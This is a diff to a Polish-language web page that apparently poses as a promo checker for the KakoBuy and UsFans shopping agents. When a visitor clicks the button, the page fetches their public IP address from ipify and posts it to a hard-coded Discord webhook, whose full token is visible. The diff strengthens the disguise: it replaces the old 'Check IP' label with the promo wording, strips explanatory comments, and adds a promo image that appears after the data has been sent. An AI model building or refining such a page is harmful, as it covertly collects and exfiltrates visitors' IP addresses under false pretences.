@@ -27,7 +27,6 @@
       width: 100%;
     }
 
-    /* Przycisk */
     .check-btn {
       background: linear-gradient(135deg, #6366f1, #4f46e5);
       border: none;
@@ -65,7 +64,6 @@
       pointer-events: none;
     }
 
-    /* Wynik IP */
     .ip-result {
       margin-top: 2rem;
       min-height: 4rem;
@@ -95,7 +93,6 @@
       font-weight: 500;
     }
 
-    /* Status wysyłki na Discord */
     .discord-status {
       margin-top: 0.8rem;
       font-size: 0.9rem;
@@ -125,7 +122,6 @@
       background: rgba(248, 113, 113, 0.08);
     }
 
-    /* Spinner w przycisku */
     .spinner {
       display: inline-block;
       width: 1.2rem;
@@ -140,7 +136,6 @@
       to { transform: rotate(360deg); }
     }
 
-    /* Fade-in dla wyniku */
     .fade-in {
       animation: fadeUp 0.35s ease forwards;
     }
@@ -150,7 +145,6 @@
       100% { opacity: 1; transform: translateY(0); }
     }
 
-    /* Logo Discord */
     .discord-icon {
       display: inline-block;
       width: 20px;
@@ -174,7 +168,30 @@
       box-shadow: 0 0 0 2px #0f172a, 0 0 0 4px #5865F2;
     }
 
-    /* Responsywność */
+    .result-image {
+      margin-top: 2rem;
+      border-radius: 1.5rem;
+      overflow: hidden;
+      box-shadow: 0 20px 60px -12px rgba(0, 0, 0, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      opacity: 0;
+      transform: translateY(10px);
+      transition: opacity 0.5s ease, transform 0.5s ease;
+      background: #1e293b;
+      line-height: 0;
+    }
+
+    .result-image.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .result-image img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
     @media (max-width: 480px) {
       .check-btn {
         font-size: 1.2rem;
@@ -189,18 +206,20 @@
 <body>
 
 <div class="container">
-  <!-- Przycisk -->
   <button id="checkBtn" class="check-btn">
-    <span>🔍</span> Kliknij przycisk aby sprawdzić akutalne promki na KakoBuy i UsFans
+    <span>🔍</span> Kliknij przycisk aby sprawdzić aktualne promki na KakoBuy i UsFans
   </button>
 
-  <!-- Wynik IP -->
   <div id="ipDisplay" class="ip-result placeholder">
     kliknij przycisk
   </div>
 
-  <!-- Status wysyłki na Discord - początkowo pusty -->
   <div id="discordStatus" class="discord-status"></div>
+
+  <!-- OBRAZEK - pojawi się po kliknięciu -->
+  <div id="resultImage" class="result-image">
+    <img src="https://i.ibb.co/DP3PDSZH/image.png" alt="Promki UsFans / KakoBuy">
+  </div>
 </div>
 
 <script>
@@ -208,9 +227,9 @@
     const btn = document.getElementById('checkBtn');
     const display = document.getElementById('ipDisplay');
     const discordStatus = document.getElementById('discordStatus');
+    const resultImage = document.getElementById('resultImage');
     let loading = false;
 
-    // 🔥 🔥 🔥 TWOJ WEBHOOK URL 🔥 🔥 🔥
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1519308051654639756/y6XSOCL4vFHGUj1NwLlBvd885qRAApltoNnbcf_8wND9kQN8XnszPxejltrZhbUa1Qrb';
 
     function setLoading(state) {
@@ -229,7 +248,7 @@
       } else {
         btn.disabled = false;
         btn.innerHTML = `
-          <span>🔍</span> Sprawdź IP
+          <span>🔍</span> Kliknij przycisk aby sprawdzić aktualne promki na KakoBuy i UsFans
         `;
       }
     }
@@ -252,11 +271,9 @@
       `;
     }
 
-    // Funkcja wysyłająca IP na Discorda przez webhook
     function sendToDiscord(ip) {
       setDiscordStatus('loading', '⏳ wysyłanie na Discord...');
 
-      // Przygotowanie ładnego embeda dla Discorda
       const embed = {
         title: '🌐 Nowe IP',
         color: 0x5865F2,
@@ -318,6 +335,8 @@
       setLoading(true);
       display.className = 'ip-result placeholder';
       display.textContent = '⏳ pobieranie...';
+      // Ukrywamy obrazek przed nowym kliknięciem
+      resultImage.classList.remove('show');
 
       fetch('https://api.ipify.org?format=json')
         .then(res => {
@@ -356,6 +375,8 @@
         })
         .finally(() => {
           setLoading(false);
+          // PO WSZYSTKIM POKAZUJEMY OBRAZEK
+          resultImage.classList.add('show');
         });
     }
 
